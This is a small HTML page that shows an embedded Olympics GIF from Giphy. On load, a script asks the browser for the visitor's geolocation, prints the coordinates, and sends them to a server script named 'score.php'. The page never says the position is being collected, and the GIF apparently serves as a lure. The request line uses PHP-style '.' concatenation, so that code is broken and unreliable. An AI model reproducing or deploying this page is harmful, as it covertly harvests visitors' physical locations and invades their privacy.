<!DOCTYPE html>
<html>
<body onload="getLocation()">

<iframe src="https://giphy.com/embed/h80RfyrARMdXABsopZ" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/TeamUSA-team-usa-olympics-throwback-throwbacks-h80RfyrARMdXABsopZ">via GIPHY</a></p>



<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, error);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {

	
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;
  
  const xhttp = new XMLHttpRequest();
	xhttp.open("GET", "score.php?lat=" . position.coords.latitude + "&long=" + position.coords.longitude);
  	xhttp.send();
	
}

function error() {
  alert("Sorry, no position available.");
}


</script>

</body>
</html>
